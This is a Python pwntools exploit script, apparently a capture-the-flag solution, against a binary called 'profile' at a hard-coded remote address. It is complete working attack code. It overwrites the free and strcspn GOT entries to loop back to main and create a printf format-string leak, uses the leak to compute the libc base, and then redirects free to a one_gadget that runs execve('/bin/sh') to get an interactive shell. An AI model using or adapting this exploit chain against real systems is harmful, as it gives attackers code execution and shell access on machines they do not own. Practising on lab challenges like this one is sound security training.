#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./profile", checksec=False)
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc 54.78.163.105 31704"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}


io = start()

# overwrite free GOT with main (can only write 8 bytes, since *n == 8)
age = elf.got["free"] << 32
io.sendline(str(age).encode())
io.sendline(p32(elf.symbols["main"]).rstrip(b"\x00"))

# can write more than 8 bytes now
# overwrite strcspn GOT with printf to achieve format string leak
age = elf.got["strcspn"] << 32
io.sendline(str(age).encode())
io.sendline(p64(elf.plt["printf"]))

for i in range(1, 5):
    io.clean()
    payload = (f"%{i}$p").encode()
    io.sendline(b"0")
    io.sendline(payload)
    io.recvuntil(b"Name: ")
    resp = io.recvline(keepends=False)
    log.info(f"{i}: {resp}")


def printf_leak(idx):
    io.clean()
    payload = (f"%{idx}$p").encode()
    io.sendline(b"0")
    io.sendline(payload)
    io.recvuntil(b"Name: ")
    resp = io.recvline(keepends=False).decode()
    return int(resp, 16)


libc_leak = printf_leak(4)
libc.address = libc_leak - 0x219b23
log.info(f"{libc.address=:#x}")

"""
0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
"""
one_gadget = libc.address + 0xebcf5

age = elf.got["free"] << 32
io.sendline(str(age).encode())
io.sendline(p64(one_gadget))
io.clean()
io.interactive()
